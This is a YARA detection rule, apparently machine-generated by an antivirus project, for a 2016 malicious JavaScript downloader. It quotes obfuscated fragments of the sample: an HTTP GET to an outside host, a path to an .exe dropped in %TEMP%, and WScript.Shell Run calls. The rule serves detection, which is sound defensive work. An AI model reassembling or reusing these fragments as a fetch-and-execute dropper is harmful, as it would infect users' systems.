rule sig_20160328_ee4e37b447a980d9e9e9df2ba7c645e5 {
  meta:
    description = "datamaliciousorder - file 20160328_ee4e37b447a980d9e9e9df2ba7c645e5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "852500963bca5e6a4f78432609cb0f88722573d4596ec414b8822c7e8c4ce622"

  strings:
    $s1  = "Heyoprx[Xlawdkuo](\"GET\", \"http://mediaheadllc.com/k9ospw1\", false);" fullword ascii
    $s2  = "function Rfrlzxuu() {return Viotwu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"TNCiFkg8CxtD.exe\";};" fullword ascii
    $s3  = "do {WScript[Sbydnspkvj](Iblbmmtndh() * 11)} while (Heyoprx[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Htmmq(Jkdjg, Oizohepb){return Jkdjg - Oizohepb;};" fullword ascii
    $s5  = "var Viotwu = function Drajqlgap() {return WScript[Gosvqujxnp](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Zaihlnw(Gwbmtcqfvp){Viotwu[\"Run\"](Gwbmtcqfvp, Kovinjmlws, Kovinjmlws);};" fullword ascii
    $s7  = "function Swimaa() {return ((Kpbtmqmqw == true) && (Kpbtmqmqw == Pltbyd)) ? 1 : Kovinjmlws;};" fullword ascii
    $s8  = "var Noqwmjxm = new this[\"Date\"]();" fullword ascii
    $s9  = "Pltbyd = true; " fullword ascii
    $s10 = "function Iblbmmtndh(){return 22;};" fullword ascii
    $s11 = "function Uwjcgxat(){return Zmvkq;};" fullword ascii
    $s12 = "function Olrtqem()" fullword ascii
    $s13 = "function Suwiw(Jokvey) {var Adcjrgsts = (1, 2, 3, 4, 5, Jokvey); return Adcjrgsts;};" fullword ascii
    $s14 = "return Htmmq(Kxnppufl, Wxyudxlph);" fullword ascii
    $s15 = "var Pltbyd = false;" fullword ascii
    $s16 = "function Bbgrt(){return Gosvqujxnp;};" fullword ascii
    $s17 = "var Flqlaqd = false;" fullword ascii
    $s18 = "Kpbtmqmqw = true; " fullword ascii
    $s19 = "var Kpbtmqmqw = false;" fullword ascii
    $s20 = " while (Iwuqc){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}